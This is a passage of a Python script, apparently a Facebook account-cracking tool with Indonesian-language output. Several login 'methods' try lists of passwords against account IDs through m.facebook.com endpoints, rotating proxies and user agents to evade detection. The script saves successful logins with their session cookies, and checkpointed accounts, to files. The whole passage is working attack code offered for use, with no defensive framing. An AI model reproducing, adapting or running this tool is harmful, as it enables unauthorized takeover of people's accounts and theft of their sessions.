			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in ses.cookies.get_dict().keys():
				tree = Tree('')
				tree.add(f'{puti}Login Checkpoint')
				tree.add(f'{kun}{idf}{x}').add(f'{kun}{pw}{x}')
				tree.add(f'{mer}Belum Hoki Wir')
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				tree = Tree("")
				tree.add(f'{puti}Login Succesfull')
				tree.add(f'{hijo}{idf}{x}').add(f'{hijo}{pw}{x}')
				tree.add(f'{hijo}{kuki}{x}').add(f'{puti}Hoki Wir')
				prints(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
	
#----------[ METODE-MBASIC ]----------#	
def metod2(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[bold white]Reguler [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
	prog.advance(des) 
	ua2 = random.choice(ugen)
	ua = random.choice('Mozilla/5.0 (Linux; Android 6.0; SHOOK,_S1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.119 Mobile Safari/537.36')
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(proxsi)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree('')
				tree.add(f'{puti}Login Checkpoint')
				tree.add(f'{kun}{idf}{x}').add(f'{kun}{pw}{x}')
				tree.add(f'{mer}Belum Hoki Wir')
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				tree = Tree("")
				tree.add(f'{puti}Login Succesfull')
				tree.add(f'{hijo}{idf}{x}').add(f'{hijo}{pw}{x}')
				tree.add(f'{hijo}{kuki}{x}').add(f'{puti}Hoki Wir')
				prints(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#----------[ METODE-ASYINC ]----------#		
def metod3(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[bold white] Async [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
	prog.advance(des) 
	ua2 = random.choice(ugen)
	ua = random.choice(['Mozilla/5.0 (Linux; Android 4.4.4; Ibiza_F2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36'])
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host": url,"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://{url}/?stype=lo&jlou=AfdK3CIAe4G0VoToF0G-kATZuEgZYH6i6s6FvO1HSCCULl-AUg2ngZOFKmM5TxGdQaGEnSZn90EGj6yKrwP1xCvoLWeI-UkjOVjkEwF3mhaJvg&smuh=35131&lh=Ac-IJQmuKcHcKuufteQ&refid=8&ref_component=mbasic_footer&_rdr","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74e8cf7e-d665-4088-9570-0eb586cc4ed4%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
			date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)}
			head = ({"Host": url,"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			bx = ses.post(f"https://{url}/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100",data=date, headers=head)
			if "checkpoint" in ses.cookies.get_dict():
				tree = Tree('')
				tree.add(f'{puti}Login Checkpoint')
				tree.add(f'{kun}{idf}{x}').add(f'{kun}{pw}{x}')
				tree.add(f'{mer}Belum Hokii Wirr{x}')
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				tree = Tree("")
				tree.add(f'{puti}Login Succesfull')
				tree.add(f'{hijo}{idf}{x}').add(f'{hijo}{pw}{x}')
				tree.add(f'{hijo}{kuki}{x}').add(f'{mer}Lagii Hoki Wirr{x}')
				prints(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#METOD PENGOCOK#
def metod4(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[bold white]New [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
	prog.advance(des) 
	ggak = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9","es-LA,es;q=0.9","es-MX,es;q=0.9"])
	ua = random.choice(ugen)
	ua2 = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=113289095462482&kid_directed_site=0&app_id=113289095462482&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D113289095462482%26scope%3Demail%252Cpublic_profile%26redirect_uri%3Dhttps%253A%252F%252Fzoom.us%252Ffacebook%252Foauth%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%26_x_zm_rtaid%3DcVJiy3uGSbSvWr-DDSZNng.1679058723947.4bc348f596f10457902323ef31509d67%26_x_zm_rhtaid%3D542%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D516d7f95-093f-4513-847e-788f90c4cbd5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fzoom.us%2Ffacebook%2Foauth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D113289095462482%26scope%3Demail%252Cpublic_profile%26redirect_uri%3Dhttps%253A%252F%252Fzoom.us%252Ffacebook%252Foauth%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%26_x_zm_rtaid%3DcVJiy3uGSbSvWr-DDSZNng.1679058723947.4bc348f596f10457902323ef31509d67%26_x_zm_rhtaid%3D542%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D516d7f95-093f-4513-847e-788f90c4cbd5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fzoom.us%2Ffacebook%2Foauth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=2099441543493930&auth_token=ed9cb45a485f81810505130bc83f37bb&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fapp_id%3D2099441543493930%26cbt%3D1693466972390%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df263885d940389%2526domain%253Daccount.hoyoverse.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.hoyoverse.com%25252Ff33e116a09cb6c8%2526relation%253Dopener%26client_id%3D2099441543493930%26display%3Dtouch%26domain%3Daccount.hoyoverse.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252F%2523%252Flogin%253Fcb_route%253D%25252Faccount%25252FaccountInfo%26locale%3Did_ID%26logger_id%3Df24ea8b6c2199ac%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df348efd0f31f7e8%2526domain%253Daccount.hoyoverse.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.hoyoverse.com%25252Ff33e116a09cb6c8%2526relation%253Dopener%2526frame%253Df506dad7e5f0a4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv11.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=2099441543493930&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df348efd0f31f7e8%26domain%3Daccount.hoyoverse.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252Ff33e116a09cb6c8%26relation%3Dopener%26frame%3Df506dad7e5f0a4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in ses.cookies.get_dict().keys():
				tree = Tree('')
				tree.add(f'{puti}Login Checkpoint')
				tree.add(f'{kun}{idf}{x}').add(f'{kun}{pw}{x}')
				tree.add(f'{mer}{ua}{x}')
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				tree = Tree("")
				tree.add(f'{puti}Login Succesfull')
				tree.add(f'{hijo}{idf}{x}').add(f'{hijo}{pw}{x}')
				tree.add(f'{hijo}{kuki}{x}').add(f'{mer}{ua}{x}')
				prints(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#----------[ SYSTEM-CONTROL ]----------#	
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	login()
